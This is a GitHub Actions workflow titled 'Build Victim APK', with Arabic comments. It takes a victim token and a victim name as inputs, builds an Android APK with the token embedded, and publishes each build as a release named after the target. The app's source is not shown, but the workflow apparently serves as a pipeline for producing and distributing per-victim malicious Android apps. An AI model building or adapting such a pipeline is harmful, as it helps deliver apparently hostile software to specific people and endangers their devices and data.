name: Build Victim APK

on:
  push:
    branches: [main]
  workflow_dispatch:
    inputs:
      victim_token:
        description: 'Victim Token'
        required: true
        default: 'DEFAULT_TOKEN'
      victim_name:
        description: 'Victim Name'
        required: false
        default: 'Unknown'

permissions:
  contents: write

jobs:
  build:
    runs-on: ubuntu-latest

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Set up JDK 17
        uses: actions/setup-java@v4
        with:
          distribution: 'temurin'
          java-version: '17'

      - name: Setup Android SDK
        run: |
          echo "ANDROID_HOME=$ANDROID_SDK_ROOT" >> $GITHUB_ENV
          yes | $ANDROID_SDK_ROOT/cmdline-tools/latest/bin/sdkmanager --licenses > /dev/null 2>&1 || true
          $ANDROID_SDK_ROOT/cmdline-tools/latest/bin/sdkmanager "platforms;android-33" "build-tools;33.0.1" > /dev/null 2>&1 || true

      - name: Setup Gradle
        uses: gradle/actions/setup-gradle@v3
        with:
          gradle-version: '8.2'
          cache-disabled: true

      # ★★★ إعداد الـ Token والاسم ★★★
      - name: Prepare tokens
        id: prep
        run: |
          if [ "${{ github.event_name }}" == "workflow_dispatch" ]; then
            TOKEN="${{ github.event.inputs.victim_token }}"
            NAME="${{ github.event.inputs.victim_name }}"
          else
            TOKEN="DEFAULT_TOKEN"
            NAME="Unknown"
          fi

          if [ -z "$TOKEN" ]; then TOKEN="DEFAULT_TOKEN"; fi
          if [ -z "$NAME" ]; then NAME="Unknown"; fi

          echo "token=$TOKEN" >> $GITHUB_OUTPUT
          echo "name=$NAME" >> $GITHUB_OUTPUT
          echo "short=$(echo $TOKEN | cut -c1-16)" >> $GITHUB_OUTPUT

          echo "=== TOKEN: $TOKEN ==="
          echo "=== NAME: $NAME ==="
          echo "=== SHORT: $(echo $TOKEN | cut -c1-16) ==="

      # ★★★ البناء مع تمرير التوكن ★★★
      - name: Build APK
        env:
          VICTIM_TOKEN: ${{ steps.prep.outputs.token }}
        run: |
          echo "Building with VICTIM_TOKEN=$VICTIM_TOKEN"
          chmod +x gradlew
          ./gradlew assembleDebug -Dorg.gradle.jvmargs=-Xmx2048m --no-daemon --stacktrace

      # ★★★ التحقق من وجود الـ APK ★★★
      - name: Verify APK exists
        run: |
          ls -la app/build/outputs/apk/debug/
          if [ ! -f app/build/outputs/apk/debug/app-debug.apk ]; then
            echo "❌ APK not found!"
            exit 1
          fi
          echo "✅ APK found"

      # ★★★ إعادة تسمية الـ APK ★★★
      - name: Rename APK
        id: rename
        run: |
          mkdir -p output
          SHORT="${{ steps.prep.outputs.short }}"
          NAME="${{ steps.prep.outputs.name }}"

          # نظّف الاسم من أي حروف غريبة
          SAFE_NAME=$(echo "$NAME" | tr -cd '[:alnum:]_-')
          if [ -z "$SAFE_NAME" ]; then SAFE_NAME="victim"; fi

          APK_NAME="Victim_${SAFE_NAME}_${SHORT}.apk"
          cp app/build/outputs/apk/debug/app-debug.apk "output/$APK_NAME"

          echo "apk_name=$APK_NAME" >> $GITHUB_OUTPUT
          echo "=== APK renamed to: $APK_NAME ==="
          ls -la output/

      # ★★★ رفع كـ Artifact ★★★
      - name: Upload Artifact
        uses: actions/upload-artifact@v4
        with:
          name: Victim-${{ steps.prep.outputs.short }}
          path: output/*.apk
          retention-days: 30

      # ★★★ إنشاء Release ★★★
      - name: Create Release
        uses: softprops/action-gh-release@v1
        with:
          tag_name: victim-${{ github.run_number }}-${{ steps.prep.outputs.short }}
          name: Victim-${{ steps.prep.outputs.name }}-${{ steps.prep.outputs.short }}
          body: |
            ## Victim APK
            
            - **Name:** ${{ steps.prep.outputs.name }}
            - **Token (first 16):** ${{ steps.prep.outputs.short }}...
            - **Build:** ${{ github.run_number }}
            - **Date:** ${{ github.event.head_commit.timestamp || github.run_started_at }}
          files: output/*.apk
          draft: false
          prerelease: false
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
